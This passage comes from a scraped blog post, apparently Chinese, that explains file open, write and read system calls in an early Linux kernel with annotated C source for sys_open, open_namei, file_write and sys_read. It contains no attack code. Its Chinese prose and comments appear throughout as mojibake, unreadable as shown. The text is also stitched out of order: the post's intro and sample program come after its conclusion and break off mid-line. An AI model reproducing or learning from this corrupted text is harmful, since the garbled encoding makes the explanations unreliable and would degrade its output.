(éœ€è¦æŒ‚è½½åˆ°çš„ä½ç½®)ï¼Œåˆ¤å®šæ˜¯å¦å…è®¸è¢«æŒ‚è½½(æ¯”å¦‚æ ¹èŠ‚ç‚¹ä¸å…è®¸æŒ‚å…¶å®ƒè®¾å¤‡)\n     */\n    ...\n\n    /* è®¾ç½®è¶…çº§å—çš„ mount æ ‡å¿— */\n    sb-\u003es_imount=dir_i;\n    /* è®¾ç½®è¯¥ i èŠ‚ç‚¹çš„ mount æ ‡å¿— */\n    dir_i-\u003ei_mount=1;\n    dir_i-\u003ei_dirt=1;        /* NOTE! we don't iput(dir_i) */\n    return 0;           /* we do that in umount */\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eæ–‡ä»¶è¯»å†™\u003c/h2\u003e\n\u003cp\u003eå‰é¢è®²äº†è¿™ä¹ˆå¤šï¼Œç»ˆäºåˆ°äº†æœ€å…³å¿ƒçš„éƒ¨åˆ†äº†ã€‚å½“ç„¶ï¼Œä¹Ÿå¹¶ä¸æ˜¯è¯´å‰é¢çš„å†…å®¹ä¸é‡è¦ï¼Œäº‹å®ä¸Šï¼Œç›¸å½“é‡è¦ï¼Œåªæ˜¯éƒ½éšè—åœ¨äº†å†…æ ¸å¼•å¯¼çš„è¿‡ç¨‹ä¸­ï¼Œä¸”è°ƒç”¨é¢‘åº¦ä½ï¼Œæ‰å¯¼è‡´äº†æ²¡æœ‰å­˜åœ¨æ„Ÿã€‚ä½†æ˜¯è¿™æ°æ°æ‰æ˜¯æ”¯æŒæ–‡ä»¶è¯»å†™çš„åŸºçŸ³ã€‚\u003c/p\u003e\n\u003cp\u003eä¸å¤šè¯´åºŸè¯ï¼Œä¸‹é¢å°±è¦å¼€å§‹æ–‡ä»¶è¯»å†™çš„å†…å®¹ã€‚\u003c/p\u003e\n\u003ch3\u003eæ‰“å¼€æ–‡ä»¶\u003c/h3\u003e\n\u003cp\u003eæ‰“å¼€æ–‡ä»¶çš„å‡½æ•°åŸå‹æ˜¯ \u003ccode\u003eint open(const char * filename, int flag, ...);\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eå½“ç„¶ï¼Œæ­¤ç±»ç³»ç»Ÿè°ƒç”¨æœ€ç»ˆçš„å®ç°éƒ½æ˜¯ \u003ccode\u003eint 0x80\u003c/code\u003e , æ˜ç¡®ä¸€ä¸ªè°ƒç”¨å·ï¼Œç„¶åå°±é™·å…¥å†…æ ¸æ€äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå†…æ ¸æ€ä¸‹è°ƒç”¨çš„å‡½æ•°æ˜¯: \u003ccode\u003eint sys_open(const char * filename,int flag,int mode)\u003c/code\u003e \u003c/p\u003e\n\u003cp\u003eæ¥çœ‹çœ‹ç»†èŠ‚:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003eint sys_open(const char * filename,int flag,int mode)\n{\n    struct m_inode * inode;\n    struct file * f;\n    int i,fd;\n\n    /*\n     * current æ˜¯ç”±å†…æ ¸æ•°æ®æ®µç»´æŠ¤çš„å½“å‰ä»»åŠ¡çš„æŒ‡é’ˆ\n     * umask æ˜¯æŒ‡å½“å‰ä»»åŠ¡åœ¨æ–°å»ºæ–‡ä»¶æ—¶çš„é»˜è®¤æ©ç \n     *   ä¾‹å¦‚ Linux é»˜è®¤æ˜¯ 022, å³æ–°å»ºæ–‡ä»¶è¢«ç¦æ­¢äº†ç»„ç”¨æˆ·ä¸å…¶å®ƒç”¨æˆ·çš„å†™æƒé™\n     * è¿™é‡Œæ˜¯å…ˆç¡®å®šæ–°å»ºæ–‡ä»¶çš„æƒé™\n     */\n    mode \u0026#x26;= 0777 \u0026#x26; ~current-\u003eumask;\n    /*\n     * æ–‡ä»¶æè¿°ç¬¦ï¼Œæ¯ä¸ªæ–‡ä»¶å•ç‹¬ç»´æŠ¤ä¸€å¥—ï¼Œä»¥æ•°å­—æ ‡è®°\n     * æ‰¾ä¸€ä¸ªç©ºé—²çš„æ–‡ä»¶æè¿°ç¬¦é¡¹\n     */\n    for(fd=0 ; fd\u0026#x3C;NR_OPEN ; fd++)\n        if (!current-\u003efilp[fd])\n            break;\n    if (fd\u003e=NR_OPEN)\n        return -EINVAL;\n    /*\n     * é¡¾åæ€ä¹‰ï¼Œè®¾ç½®åœ¨è°ƒç”¨ exec() å‡½æ•°æ—¶ä¸»åŠ¨å…³é—­çš„æ–‡ä»¶\n     * exec() é€šå¸¸ä¸ fork() è”ç”¨ï¼Œfork() è´Ÿè´£å¤åˆ¶ä¸€ä¸ªä»»åŠ¡ï¼Œè€Œ exec è´Ÿè´£æ›¿æ¢æ–°ä»»åŠ¡çš„ä»£ç å’Œæ•°æ®æ®µ(ä»è€Œäº§ç”Ÿä¸€ä¸ªæ–°çš„ä»»åŠ¡)\n     * è¿™é‡Œçš„å£°æ˜å³æ˜¯å¤ä½ fd ä½ç½®çš„æ ‡å¿—ï¼Œå…è®¸å­ä»»åŠ¡ä¹ŸæŒæœ‰ç›¸åŒçš„æ–‡ä»¶æè¿°ç¬¦é¡¹\n     */\n    current-\u003eclose_on_exec \u0026#x26;= ~(1\u0026#x3C;\u0026#x3C;fd);\n    f=0+file_table;\n    /* åœ¨æ–‡ä»¶è¡¨ä¸­æ‰¾ä¸€é¡¹ç©ºé—²çš„ */\n    for (i=0 ; i\u0026#x3C;NR_FILE ; i++,f++)\n        if (!f-\u003ef_count) break;\n    if (i\u003e=NR_FILE)\n        return -EINVAL;\n    /* å½“å‰ä»»åŠ¡çš„æ–‡ä»¶æè¿°ç¬¦é¡¹æŒ‡å‘æ–‡ä»¶è¡¨é¡¹, åŒæ—¶æ–‡ä»¶è¡¨é¡¹çš„å¼•ç”¨è®¡æ•°+1*/\n    (current-\u003efilp[fd]=f)-\u003ef_count++;\n    /* è°ƒç”¨ open_namei æ‰“å¼€æ–‡ä»¶ï¼Œå¦‚æœå¤±è´¥åˆ™é‡Šæ”¾åˆšæ‰å ç”¨çš„æ–‡ä»¶ç»“æ„ï¼Œå¹¶è¿”å›é”™è¯¯ç  */\n    if ((i=open_namei(filename,flag,mode,\u0026#x26;inode))\u0026#x3C;0) {\n        current-\u003efilp[fd]=NULL;\n        f-\u003ef_count=0;\n        return i;\n    }\n    /* \n     * å¯¹ä¸åŒçš„æ–‡ä»¶è¿›è¡Œä¸åŒçš„ç‰¹æ®Šå¤„ç†, æ¯•ç«Ÿæœ‰ \"ä¸€åˆ‡çš†æ–‡ä»¶\" çš„å£å·å˜›\n     * è¯¸å¦‚å­—ç¬¦è®¾å¤‡ç­‰ä¹Ÿéƒ½æ˜¯æ–‡ä»¶\n     */\n/* ttys are somewhat special (ttyxx major==4, tty major==5) */\n    if (S_ISCHR(inode-\u003ei_mode))\n        if (MAJOR(inode-\u003ei_zone[0])==4) {\n            if (current-\u003eleader \u0026#x26;\u0026#x26; current-\u003etty\u0026#x3C;0) {\n                current-\u003etty = MINOR(inode-\u003ei_zone[0]);\n                tty_table[current-\u003etty].pgrp = current-\u003epgrp;\n            }\n        } else if (MAJOR(inode-\u003ei_zone[0])==5)\n            if (current-\u003etty\u0026#x3C;0) {\n                iput(inode);\n                current-\u003efilp[fd]=NULL;\n                f-\u003ef_count=0;\n                return -EPERM;\n            }\n/* Likewise with block-devices: check for floppy_change */\n    if (S_ISBLK(inode-\u003ei_mode))\n        check_disk_change(inode-\u003ei_zone[0]);\n    /* åˆå§‹åŒ–å†…å­˜æ–‡ä»¶ç»“æ„çš„å„ä¸ªå‚æ•° */\n    f-\u003ef_mode = inode-\u003ei_mode;\n    f-\u003ef_flags = flag;\n    f-\u003ef_count = 1;\n    f-\u003ef_inode = inode;\n    f-\u003ef_pos = 0;\n    return (fd);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eåœ¨æ•´ä¸ªæ‰“å¼€æ–‡ä»¶çš„è¿‡ç¨‹ä¸­ï¼Œé™¤äº†çœŸæ­£å»æ–‡ä»¶ç³»ç»ŸæŸ¥æ‰¾æ–‡ä»¶çš„æ—¶å€™ç”¨åˆ°äº†æ–‡ä»¶åï¼Œå…¶å®ƒæ—¶å€™ï¼Œéƒ½å°†æ˜¯ä»¥æ–‡ä»¶æè¿°ç¬¦è¿›è¡Œäº¤äº’çš„ã€‚\u003c/p\u003e\n\u003cp\u003eå†çœ‹çœ‹æ›´ç»†èŠ‚çš„æ–¹é¢ï¼Œæ¯•ç«Ÿå°±ç›®å‰æ¥è¯´ï¼Œæˆ‘ä»¬è·³è¿‡äº†æœ€é‡è¦çš„ä¸€ç¯ \u003ccode\u003eopen_namei\u003c/code\u003e ï¼Œä»è€Œçœ‹ä¼¼æ•´ä¸ªæµç¨‹éƒ½ç®€å•äº†å¾ˆå¤šå¾ˆå¤šã€‚\u003c/p\u003e\n\u003cp\u003eé€šå¸¸æˆ‘ä»¬åœ¨ç¼–ç è¿‡ç¨‹ä¸­éƒ½æ˜¯é€šè¿‡ç»å¯¹åœ°å€/ç›¸å¯¹åœ°å€æ¥å”¯ä¸€å®šä½ä¸€ä¸ªæ–‡ä»¶ã€‚å› æ­¤ï¼Œå°±å¿…ç„¶å­˜åœ¨é€çº§å¯»æ‰¾æ–‡ä»¶çš„è¿‡ç¨‹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003estatic struct m_inode * get_dir(const char * pathname)\n{\n    char c;\n    const char * thisname;\n    struct m_inode * inode;\n    struct buffer_head * bh;\n    int namelen,inr,idev;\n    struct dir_entry * de;\n\n    /* åˆ¤å®šå½“å‰ä»»åŠ¡è®¾å®šçš„æ ¹èŠ‚ç‚¹æ˜¯å¦æœ‰æ•ˆ */\n    if (!current-\u003eroot || !current-\u003eroot-\u003ei_count)\n        panic(\"No root inode\");\n    /* åˆ¤å®šå½“å‰è·¯å¾„ièŠ‚ç‚¹æ˜¯å¦æœ‰æ•ˆ */\n    if (!current-\u003epwd || !current-\u003epwd-\u003ei_count)\n        panic(\"No cwd inode\");\n    /* \n     * è¿™é‡Œçš„ get_fs_byte(..) æ˜¯å®å®šä¹‰ï¼Œfs æŒ‡çš„æ˜¯ FS æ®µå¯„å­˜å™¨\n     * Linux å†…æ ¸å°† DS, ES ç”¨äºå†…æ ¸æ•°æ®æ®µ, ç”¨ FS æŒ‡å‘å±€éƒ¨æè¿°ç¬¦è¡¨çš„å½“å‰ä»»åŠ¡æ•°æ®æ®µ\n     * è¿™é‡Œå¯ä»¥ç®€å•ç†è§£æˆå–å­—ç¬¦æ•°ç»„çš„ç¬¬ä¸€ä¸ªå­—èŠ‚\n     */\n    if ((c=get_fs_byte(pathname))=='/') {\n        inode = current-\u003eroot;\n        pathname++;\n    } else if (c)\n        inode = current-\u003epwd;\n    else\n        return NULL;    /* empty name is bad */\n    inode-\u003ei_count++;\n    while (1) {\n        thisname = pathname;\n        if (!S_ISDIR(inode-\u003ei_mode) || !permission(inode,MAY_EXEC)) {\n            iput(inode);\n            return NULL;\n        }\n        for(namelen=0;(c=get_fs_byte(pathname++))\u0026#x26;\u0026#x26;(c!='/');namelen++)\n            /* nothing */ ;\n        if (!c)\n            return inode;\n        if (!(bh = find_entry(\u0026#x26;inode,thisname,namelen,\u0026#x26;de))) {\n            iput(inode);\n            return NULL;\n        }\n        inr = de-\u003einode;\n        idev = inode-\u003ei_dev;\n        brelse(bh);\n        iput(inode);\n        if (!(inode = iget(idev,inr)))\n            return NULL;\n    }\n}\n\n/*\n *  dir_namei()\n *\n * å¤„ç†è·¯å¾„ pathname, å¤„ç†æˆièŠ‚ç‚¹è¡¨ç¤ºçš„æœ€ç»ˆä¸€çº§ç›®å½•+ç›®å½•ä¸‹æ–‡ä»¶å(ä¹Ÿå¯èƒ½pathnameè¡¨ç¤ºçš„å°±æ˜¯ç›®å½•)\n */\nstatic struct m_inode * dir_namei(const char * pathname, int * namelen, const char ** name)\n{\n    char c;\n    const char * basename;\n    struct m_inode * dir;\n\n    if (!(dir = get_dir(pathname)))\n        return NULL;\n    basename = pathname;\n    while (c=get_fs_byte(pathname++))\n        if (c=='/')\n            basename=pathname;\n    *namelen = pathname-basename-1;\n    *name = basename;\n    return dir;\n}\n\n/*\n *  open_namei()\n *\n * namei for open - this is in fact almost the whole open-routine.\n */\nint open_namei(const char * pathname, int flag, int mode,\n    struct m_inode ** res_inode)\n{\n    const char * basename;\n    int inr,dev,namelen;\n    struct m_inode * dir, *inode;\n    struct buffer_head * bh;\n    struct dir_entry * de;\n\n    if ((flag \u0026#x26; O_TRUNC) \u0026#x26;\u0026#x26; !(flag \u0026#x26; O_ACCMODE))\n        flag |= O_WRONLY;\n    mode \u0026#x26;= 0777 \u0026#x26; ~current-\u003eumask;\n    mode |= I_REGULAR;\n    if (!(dir = dir_namei(pathname,\u0026#x26;namelen,\u0026#x26;basename)))\n        return -ENOENT;\n    /* å¦‚æœç»™çš„ pathname æ˜¯ä¸€ä¸ªç›®å½• */\n    if (!namelen) {         /* special case: '/usr/' etc */\n        if (!(flag \u0026#x26; (O_ACCMODE|O_CREAT|O_TRUNC))) {\n            *res_inode=dir;\n            return 0;\n        }\n        iput(dir);\n        return -EISDIR;\n    }\n    /* æ‰¾åˆ°ç›®å½•å¯¹åº”çš„ièŠ‚ç‚¹çš„æ•°æ®å— */\n    bh = find_entry(\u0026#x26;dir,basename,namelen,\u0026#x26;de);\n    if (!bh) {\n        if (!(flag \u0026#x26; O_CREAT)) {\n            iput(dir);\n            return -ENOENT;\n        }\n        if (!permission(dir,MAY_WRITE)) {\n            iput(dir);\n            return -EACCES;\n        }\n        inode = new_inode(dir-\u003ei_dev);\n        if (!inode) {\n            iput(dir);\n            return -ENOSPC;\n        }\n        inode-\u003ei_uid = current-\u003eeuid;\n        inode-\u003ei_mode = mode;\n        inode-\u003ei_dirt = 1;\n        bh = add_entry(dir,basename,namelen,\u0026#x26;de);\n        if (!bh) {\n            inode-\u003ei_nlinks--;\n            iput(inode);\n            iput(dir);\n            return -ENOSPC;\n        }\n        de-\u003einode = inode-\u003ei_num;\n        bh-\u003eb_dirt = 1;\n        brelse(bh);\n        iput(dir);\n        *res_inode = inode;\n        return 0;\n    }\n    inr = de-\u003einode;\n    dev = dir-\u003ei_dev;\n    brelse(bh);\n    iput(dir);\n    if (flag \u0026#x26; O_EXCL)\n        return -EEXIST;\n    if (!(inode=iget(dev,inr)))\n        return -EACCES;\n    if ((S_ISDIR(inode-\u003ei_mode) \u0026#x26;\u0026#x26; (flag \u0026#x26; O_ACCMODE)) ||\n        !permission(inode,ACC_MODE(flag))) {\n        iput(inode);\n        return -EPERM;\n    }\n    inode-\u003ei_atime = CURRENT_TIME;\n    if (flag \u0026#x26; O_TRUNC)\n        truncate(inode);\n    *res_inode = inode;\n    return 0;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eæ–‡ä»¶å†™å…¥\u003c/h3\u003e\n\u003cp\u003eæ¥ä¸‹æ¥å°±è¦è¿›è¡Œæ–‡ä»¶å†™å…¥çš„æµç¨‹äº†\u003c/p\u003e\n\u003cp\u003eå¦‚ä½•é™·å…¥å†…æ ¸æ€å‡½æ•°å°±ä¸å†ç»†è¯´äº†ï¼Œç›¸ä¿¡çœ‹è¿‡è¿™ä¹ˆå¤šç³»ç»Ÿè°ƒç”¨ä¹‹åï¼Œä¹Ÿèƒ½çŸ¥é“åŸºæœ¬ä¸Šç³»ç»Ÿè°ƒç”¨åœ¨å†…æ ¸æ€å¯¹åº”çš„å‡½æ•°éƒ½æ˜¯ä»¥ sys_ å½¢å¼å‡ºç°çš„\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003eint sys_write(unsigned int fd,char * buf,int count)\n{\n    struct file * file;\n    struct m_inode * inode;\n\n    /* éæ³• fd , æŠ›å¼‚å¸¸ */\n    if (fd\u003e=NR_OPEN || count \u0026#x3C;0 || !(file=current-\u003efilp[fd]))\n        return -EINVAL;\n    /* count = 0ï¼Œæ— éœ€å†™å…¥æ•°æ® */\n    if (!count)\n        return 0;\n    inode=file-\u003ef_inode;\n    /* é’ˆå¯¹ä¸åŒçš„ièŠ‚ç‚¹ç±»å‹ï¼Œæœ‰ä¸åŒçš„å†™å…¥å‡½æ•° */\n    if (inode-\u003ei_pipe)\n        return (file-\u003ef_mode\u0026#x26;2)?write_pipe(inode,buf,count):-EIO;\n    if (S_ISCHR(inode-\u003ei_mode))\n        return rw_char(WRITE,inode-\u003ei_zone[0],buf,count,\u0026#x26;file-\u003ef_pos);\n    if (S_ISBLK(inode-\u003ei_mode))\n        return block_write(inode-\u003ei_zone[0],\u0026#x26;file-\u003ef_pos,buf,count);\n    if (S_ISREG(inode-\u003ei_mode))\n        return file_write(inode,file,buf,count);\n    printk(\"(Write)inode-\u003ei_mode=%06o\\n\\r\",inode-\u003ei_mode);\n    return -EINVAL;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eçœ‹çœ‹å¯¹äºå¸¸è§„æ–‡ä»¶æ˜¯æ€ä¹ˆæ“ä½œçš„å§ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003eint file_write(struct m_inode * inode, struct file * filp, char * buf, int count)\n{\n    off_t pos;      /* åç§»é‡ */\n    int block,c;\n    struct buffer_head * bh;\n    char * p;\n    int i=0;\n\n    /* å¦‚æœæ˜¯ Append æ¨¡å¼ï¼ŒæŠŠåç§»é‡é‡ç½®åˆ°æ–‡ä»¶æœ«å°¾ */\n    if (filp-\u003ef_flags \u0026#x26; O_APPEND) \n        pos = inode-\u003ei_size;\n    /* å¦åˆ™å°±ä½¿ç”¨å½“å‰æ–‡ä»¶æ•°æ®ç»“æ„æŒæœ‰çš„åç§»é‡ */\n    /*\n        é™„ä¸Šæ•°æ®ç»“æ„  file çš„å†…å®¹ \n        struct file {\n            unsigned short f_mode;\n            unsigned short f_flags;\n            unsigned short f_count;\n            struct m_inode * f_inode;\n            off_t f_pos;    æ¯ä¸ªæ‰“å¼€çš„æ–‡ä»¶éƒ½å°†æŒæœ‰å½“å‰çš„åç§»å€¼\n        };\n     */\n    else\n        pos = filp-\u003ef_pos;\n    /* é€å­—ç¬¦å‘ç¼“å†²åŒºå†™å…¥æ•°æ® */\n    while (i\u0026#x3C;count) {\n        /* æœ€å¼€å§‹å½“ç„¶æ˜¯åˆ›å»ºåœ¨ç£ç›˜ä¸Šå ç”¨ä¸€ä¸ªæ•°æ®å—äº† (å¦‚æœæ–‡ä»¶å¯¹åº”çš„å—ä¸å­˜åœ¨çš„è¯) */\n        if (!(block = create_block(inode,pos/BLOCK_SIZE)))\n            break;\n        /* æ ¹æ®æ•°æ®å—è·å¾—ç›¸åº”çš„ç¼“å†²å— */\n        if (!(bh=bread(inode-\u003ei_dev,block)))\n            break;\n        /* åœ¨ç¼“å†²å—ä¸­çš„åç§»é‡ */\n        c = pos % BLOCK_SIZE;\n        /* å®šä½åˆ°å…·ä½“çš„ç¼“å†²åŒºçš„å†…å­˜åœ°å€ */\n        p = c + bh-\u003eb_data;\n        bh-\u003eb_dirt = 1;\n        /* å½“å‰è¿™ä¸ªç¼“å†²å—è¿˜æœ‰å¤šå°‘å­—èŠ‚å¯å†™ */\n        c = BLOCK_SIZE-c;\n        /* å¦‚æœéœ€è¦å†™å…¥çš„æ•°æ®é‡å°‘äº c */\n        if (c \u003e count-i) c = count-i;\n        /* æ·»åŠ åç§»é‡è®¡æ•°, æ›´æ–°æ•°æ®ç»“æ„ä¸­ç»´æŠ¤çš„å€¼ */\n        pos += c;\n        if (pos \u003e inode-\u003ei_size) {\n            inode-\u003ei_size = pos;\n            inode-\u003ei_dirt = 1;\n        }\n        i += c;\n        /* å‘ç¼“å†²å—é€å­—èŠ‚å†™å…¥æ•°æ® */\n        while (c--\u003e0)\n            *(p++) = get_fs_byte(buf++);\n        /* é‡Šæ”¾å¯¹ç¼“å†²å—çš„å ç”¨ï¼Œå½“ç„¶ï¼Œåœ¨é‡Šæ”¾å‰ä¼šå®Œæˆç¼“å†²å—\u0026#x3C;-\u003eå¤–å­˜æ•°æ®å—çš„åŒæ­¥ */\n        brelse(bh);\n    }\n    inode-\u003ei_mtime = CURRENT_TIME;\n    if (!(filp-\u003ef_flags \u0026#x26; O_APPEND)) {\n        /* é APPEND æ¨¡å¼ï¼Œæ›´æ–°æ–‡ä»¶è¯»å†™æŒ‡é’ˆ(åç§»é‡); APPEND æ¨¡å¼æ˜¯ä½¿ç”¨ inode-\u003ei_size ï¼Œæ‰€æœ‰å°±ä¸éœ€è¦åœ¨è¿™é‡Œæ›´æ–°äº† */\n        filp-\u003ef_pos = pos;\n        inode-\u003ei_ctime = CURRENT_TIME;\n    }\n    return (i?i:-1);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eæ˜¯ä¸æ˜¯è§‰å¾—ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¤ªé«˜å¤§ä¸Šçš„æ“ä½œã€‚ç¡®å®å¦‚æ­¤ï¼Œæ›´å¤šå…³äºç¼“å­˜å—ä¸æ–‡ä»¶ç³»ç»Ÿæ•°æ®å—çš„åŒæ­¥éƒ½å·²ç»è¢«åŒ…è£…åˆ° bread(), brelse() ä¸­äº†ã€‚\u003c/p\u003e\n\u003cp\u003eä¸è¿‡ï¼Œæš‚æ—¶æ— éœ€ç»†ç©¶ã€‚æ€»ä¹‹åˆ°æ­¤ä¸ºæ­¢ï¼Œå…ˆè¦æœ‰ä¸€ä¸ªåŸºç¡€çš„è§‚å¿µ: æ‰€æœ‰ä¸å¤–å­˜å‚¨å™¨(è¿™é‡Œä¹ŸåŒ…æ‹¬æ§åˆ¶å°ç­‰)è¿›è¡Œæ•°æ®äº¤äº’éƒ½å¿…é¡»ç»è¿‡ç¼“å†²åŒº\u003c/p\u003e\n\u003cp\u003eç¼“å†²åŒºå°è£…äº†å¯¹å¤–å­˜å‚¨å™¨çš„å…¨éƒ¨æ“ä½œï¼Œè€Œæä¾›ç»™ CPU æ›´é«˜æ•ˆçš„ I/O æ“ä½œï¼Œå½“ç„¶ï¼Œä¹Ÿæ›´ä¸ºç®€å•å¿«æ·\u003c/p\u003e\n\u003ch3\u003eæ–‡ä»¶è¯»å–\u003c/h3\u003e\n\u003cp\u003eè‡³äºæ–‡ä»¶è¯»å–ï¼Œä¹ŸåŸºæœ¬ç±»ä¼¼äº†ï¼Œæ‰€ä»¥ä¹Ÿå°±ä¸å†æ·±å…¥æè¿°ã€‚\u003c/p\u003e\n\u003cp\u003eå½“ç„¶ï¼Œè¦æ³¨æ„çš„å°±æ˜¯ï¼Œåœ¨æœ¬ç¯‡å¼€å§‹çš„éƒ¨åˆ†æä¾›çš„ä¾‹ç¨‹ä¸­ï¼Œwrite \u0026#x26; read ä¸­æ’å…¥äº† \u003ccode\u003eoff_t off = lseek(fd, 0, SEEK_SET);\u003c/code\u003e  è¿™æ ·çš„ä»£ç ã€‚\u003c/p\u003e\n\u003cp\u003eåŸå› åº”è¯¥ä¹Ÿèƒ½å¤Ÿæƒ³åˆ°ï¼Œå­¦ä¹  \u003ccode\u003esys_write(..)\u003c/code\u003e çš„æ—¶å€™æˆ‘ä»¬å·²ç»çœ‹åˆ°ï¼Œä»»åŠ¡å¯¹åŒä¸€ä¸ªæ–‡ä»¶åœ¨å†…å­˜ä¸­ç»´æŠ¤äº†ä¸€ä¸ªæ–‡ä»¶è¯»å†™åç§»é‡ã€‚å› æ­¤ï¼Œè¦è¯»å–åˆšæ‰å†™å…¥çš„å†…å®¹ï¼Œå°±ä¸å¾—ä¸å…ˆæ”¹åŠ¨è¿™ä¸ªè¯»å†™åç§»é‡äº†\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003eint sys_read(unsigned int fd,char * buf,int count)\n{\n    struct file * file;\n    struct m_inode * inode;\n\n    if (fd\u003e=NR_OPEN || count\u0026#x3C;0 || !(file=current-\u003efilp[fd]))\n        return -EINVAL;\n    if (!count)\n        return 0;\n    verify_area(buf,count);\n    inode = file-\u003ef_inode;\n    if (inode-\u003ei_pipe)\n        return (file-\u003ef_mode\u0026#x26;1)?read_pipe(inode,buf,count):-EIO;\n    if (S_ISCHR(inode-\u003ei_mode))\n        return rw_char(READ,inode-\u003ei_zone[0],buf,count,\u0026#x26;file-\u003ef_pos);\n    if (S_ISBLK(inode-\u003ei_mode))\n        return block_read(inode-\u003ei_zone[0],\u0026#x26;file-\u003ef_pos,buf,count);\n    if (S_ISDIR(inode-\u003ei_mode) || S_ISREG(inode-\u003ei_mode)) {\n        if (count+file-\u003ef_pos \u003e inode-\u003ei_size)\n            count = inode-\u003ei_size - file-\u003ef_pos;\n        if (count\u0026#x3C;=0)\n            return 0;\n        return file_read(inode,file,buf,count);\n    }\n    printk(\"(Read)inode-\u003ei_mode=%06o\\n\\r\",inode-\u003ei_mode);\n    return -EINVAL;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eå°ç»“\u003c/h2\u003e\n\u003cp\u003eè¿™ç¯‡å¯¹æ–‡ä»¶ç³»ç»Ÿçš„ä»£ç å±‚é¢çš„æè¿°ï¼Œä»…ä»…åªæ˜¯æ¡äº†ä¸€ä¸ªç›¸å½“æœ‰é™çš„ç‰‡é¢ (å¸¸è§„æ–‡ä»¶è¯»å†™)ã€‚ä»æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½å¼€å§‹æä¾›äº†ä¸€ä¸ªè¯»å†™çš„å®Œæ•´æµç¨‹ä»‹ç»(å½“ç„¶ï¼Œå¾ˆå¤šç»†èŠ‚æ˜¯ç¼ºå¤±çš„ï¼Œä¸è¿‡ä¸è¦ç€æ€¥)ã€‚\u003c/p\u003e\n\u003cp\u003eè™½ç„¶å¹³å¸¸éƒ½èƒ½å¤Ÿäº†è§£åˆ°ä¸€ä¸ªæ¯”è¾ƒæ¨¡ç³Šçš„å‰æï¼Œæ–‡ä»¶è¯»å†™éœ€è¦åˆ©ç”¨ç¼“å†²åŒºï¼Œä½†æ˜¯ç©¶ç«Ÿä»€ä¹ˆæ˜¯ç¼“å­˜åŒºï¼Œå¦‚ä½•ä½¿ç”¨éƒ½ä¸ä¼šæœ‰å¤ªå¤šçš„æ¦‚å¿µã€‚æœ¬ç¯‡æœ€å¤§çš„é‡ç‚¹ï¼Œå°±æ˜¯é¦–å…ˆè¯·è¯»è€…ä»¬å»ºç«‹èµ·ä¸€ä¸ªåŸºç¡€æ€§çš„å¯¹ç¼“å†²åŒºçš„äº†è§£ã€‚äº‹å®ä¸Šï¼Œè¿™ä¸ªä¸­ä»‹åœ¨ I/O ä¸­æ‰®æ¼”äº†ç›¸å½“é‡è¦çš„è§’è‰²ã€‚è€Œä¸”å†…å­˜ä¹Ÿä¸ºå…¶æä¾›äº†ç›¸å½“å¤§çš„ä¸€ä»½ç©ºé—´ï¼Œå·®ä¸å¤šæœ‰ 1/4 äº†ã€‚\u003c/p\u003e\n\u003cp\u003eè·¨äº†å·®ä¸å¤šåŠä¸ªå¤šæœˆæ¥å†™ï¼Œä¸Šä¸‹æ–‡çš„æ‰¿æ¥å¯èƒ½æœ‰äº›ç”Ÿç¡¬äº†ï¼Œç”šè‡³ä¸ä¸€è‡´äº†... å°´å°¬...\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-plain\"\u003e  __                    __                  \n / _| __ _ _ __   __ _ / _| ___ _ __   __ _ \n| |_ / _` | '_ \\ / _` | |_ / _ \\ '_ \\ / _` |\n|  _| (_| | | | | (_| |  _|  __/ | | | (_| |\n|_|  \\__,_|_| |_|\\__, |_|  \\___|_| |_|\\__, |\n                 |___/                |___/ \n\u003c/code\u003e\u003c/pre\u003e","digest":"\u003cp\u003e\u003ca href=\"https://dormouse-none.github.io/2018-10-14-understand-Kernel-5/\"\u003eå‰ä¸€ç¯‡\u003c/a\u003eå·²ç»æè¿°å¯¹æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œäº†å®è§‚æ€§çš„æè¿°ï¼Œè¿™ä¸€ç¯‡ï¼Œå°†ä»¥ç‰¹å®šçš„æ–‡ä»¶è¯»å†™æ“ä½œä¸ºç¤ºä¾‹ï¼Œä¸²è”å¯¹æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„åŸºæœ¬æ“ä½œã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå…ˆæ¥çœ‹çœ‹å¹³å°ç›¸å…³çš„æ–‡ä»¶è¯»å†™æ“ä½œçš„ C ä»£ç æ˜¯æ€æ ·ä¸€ä¸ªè°ƒç”¨æ–¹å¼\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003e#include \u0026#x3C;stdio.h\u003e\n#include \u0026#x3C;stdlib.h\u003e\n#include \u0026#x3C;string.h\u003e\n#include \u0026#x3C;unistd.h\u003e\n#include \u0026#x3C;fcntl.h\u003e\n#include \u0026#x3C;errno.h\u003e\n#include \u0026#x3C;sys/types.h\u003e\n#include \u0026#x3C;sys/stat.h\u003e\n\nint panic()\n{\n    fprintf(stderr, \"%s (errno=%d)\\n\", strerror(errno), errno);\n    return -1;\n}\n\nint main(int argc, char *argv[])\n{\n    /* æ‰“å¼€æ–‡ä»¶ frw.txt (ä»¥å¯è¯»å†™ | è‹¥ä¸å­˜åœ¨åˆ™æ–°å»ºçš„å½¢å¼) */\n    int fd = open(\"/root/frw.txt\", O_RDWR | O_CREAT);\n    if (fd == -1)\n        return panic();\n\n    /* å‘æ–‡ä»¶å†™å…¥ Hello World! å…±è®¡ 12 ä¸ªå­—ç¬¦ */\n    ssize_t wsize = write(fd, \"Hello World!\", 12);\n    if (wsize == -1)\n        return panic();\n\n    /* é‡å®šä½æ–‡ä»¶è¯»å†™æŒ‡é’ˆ 